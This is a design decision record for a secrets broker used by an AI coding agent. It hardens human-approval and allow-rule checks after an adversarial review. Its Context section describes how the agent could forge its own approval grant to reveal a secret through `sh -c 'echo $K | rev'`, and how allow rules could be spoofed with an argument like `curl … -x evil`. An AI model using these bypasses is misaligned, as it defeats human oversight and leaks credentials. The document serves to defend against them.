# ADR 0007 — Broker-verified approvals and pinned allow rules

- **Status:** accepted
- **Date:** 2026-11-15
- **Verified against:** independent adversarial review of SPEC v3. Native prompt APIs must be verified in the Phase 0 spike (SPEC §15).

## Context

The review found two T2 breaks in v3:

1. **Forged approvals.** The `ask` grant was minted by `hook pre` and "approved" by Claude Code's permission dialog. The agent can
   run `keygent hook pre` with forged JSON itself, get a grant, and run `keygent run --grant … -- sh -c 'echo $K | rev'` without
   a human ever seeing a prompt. In permissive permission modes Claude Code may also skip the dialog.
2. **Spoofable allow rules.** `allow_cmds = ["stripe *"]` matched `argv[0]` by name, resolved through the **client's** PATH and cwd, and
   accepted any trailing arguments (`curl … -x evil`).

## Decision

### Approvals are observed by the broker, not asserted by a client

A grant becomes "approved" only when the broker itself verifies one of:

| Channel | How the broker verifies | Display the human trusts |
|---|---|---|
| Native UV prompt: macOS LocalAuthentication (via `objc2`). **Windows: pending the Phase 0 pass/fail spike** (per-request prompt text required: `UserConsentVerifier` via minimal COM bindings, or a per-grant Passport key signing `H(grant_key ‖ nonce)`). **Until it passes, Windows has no native channel** (SPEC §4.3 is canonical) | the broker raises the prompt itself, with the rendered request as reason text, and verifies the result in-process (Windows: verifies the signature) | OS system dialog |
| `keygent approve` in the human's terminal | mutual passphrase challenge-response (SPEC §5.5) | the human's own terminal |
| Passkey on the console | WebAuthn assertion over `H(nonce ‖ approve ‖ grant_id ‖ cmd_hash)`, origin bound to the broker-launched UI child | the console page served by the broker's child |

Claude Code's dialog is kept as an explicit, opt-in **`confirm`** mode, documented as T1-only. The default mode is **`approve`**.
Linux has no universal native UV prompt without root-installed polkit policy (forbidden by device safety), so on Linux the channels are
`keygent approve` and the console.

### Allow rules pin what runs

- A rule pins an **absolute executable path + SHA-256**, captured from the binary the human approved. On a hash mismatch the rule
  no longer matches, so updates fall back to `approve`, and the next approval can refresh the pin.
- Positional argument grammar: `*` = exactly one argument not starting with `-`, `**` = the rest, and `**` only together with a `flags` allowlist; allow rules are env-only (no placeholders).
- **Never wildcard-allowable:** shells, interpreters and generic transfer tools. These need exact argv or `approve`.
- The allow-rule path **execs directly without a shell**, ignores the client environment (including PATH), and uses the broker's
  minimal env. A command with shell operators never matches a rule.
- PowerShell never matches rules in v1, because its aliases and subexpressions make tokenizing for allowlisting unsafe.

## Consequences

- First use of a secret prompts the human. That's intended. Adding an allow rule (with auth) makes repeat use of a bound tool silent and safe; `--remember` only skips prompts for the identical command for 15 minutes.
- Requires native prompt code per OS (spike: whether a windowless background broker can raise it; the fallback is a helper process).
- Residuals: a replaced `keygent` binary or shell alias can show a fake terminal prompt (**T2** since SPEC v6 round 4; the passphrase is phishable, native UV is not; mitigated by sandbox write-deny and the binary path/signature shown at every prompt). Verify-then-exec
  TOCTOU exists on macOS and Windows (Linux uses `fexecve`).
